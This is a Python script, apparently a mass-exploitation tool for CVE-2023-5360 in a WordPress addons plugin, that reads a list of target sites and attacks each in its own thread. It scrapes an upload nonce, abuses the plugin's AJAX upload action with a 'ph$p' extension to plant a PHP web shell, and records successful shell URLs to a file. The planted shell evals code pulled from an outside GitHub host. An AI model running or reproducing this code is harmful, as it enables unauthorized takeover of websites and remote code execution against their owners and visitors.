# -*- coding: utf-8 -*-
import requests
import time
import re
import random
import os
import sys
import json
from random import sample
import threading
from colorama import Fore, Style, init
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
}

def gas(url):
    if url.endswith('/'):
        url = url[:-1]
    try:
        urle = 'https://'+url
        shell = """ <?php @eval("?>".file_get_contents("https://raw.githubusercontent.com/ajibarangxploit/shinx/main/shin.php"));?>"""
        filename = 'shin.ph$p'  
        files = {'uploaded_file': (filename, shell)}
        hehe = requests.get(urle, timeout=10).content 
        regex_nonce = re.findall('WprConfig\\s*=\\s*{[^}]*"nonce"\\s*:\\s*"([^"]*)"', hehe)[0]
        data={'action': 'wpr_addons_upload_file', 'max_file_size': '0', 'wpr_addons_nonce': regex_nonce, 'allowed_file_types': 'ph$p', 'triggering_event': 'click'}
        req = requests.post(urle+'/wp-admin/admin-ajax.php', data=data, files=files, timeout=10).content
        if '{"success":true,"data":' in req:
            print('Uploaded : ' + ' ' + url + '/wp-content/uploads/wpr-addons/forms/shin.php')
            open('Shells.txt','a').write(urle + '/wp-content/uploads/wpr-addons/forms/shin.php'+'\n')
        else:
            print('BAD ' + r + urle + ' ' +o + c+  'Shin_Code')
    except:
        pass

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print "{} CVE-2023-5360  | {}Shin Code\n".format(y,c)
    file_name = raw_input('Enter the filename (e.g., list.txt): ')
    try:
        with open(file_name, 'r') as file:
            url_list = file.read().splitlines()
    except IOError:
        print 'File not found. Make sure the file exists in the same directory as this script.'

    threads = []
    for url in url_list:
        t = threading.Thread(target=gas, args=(url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
        
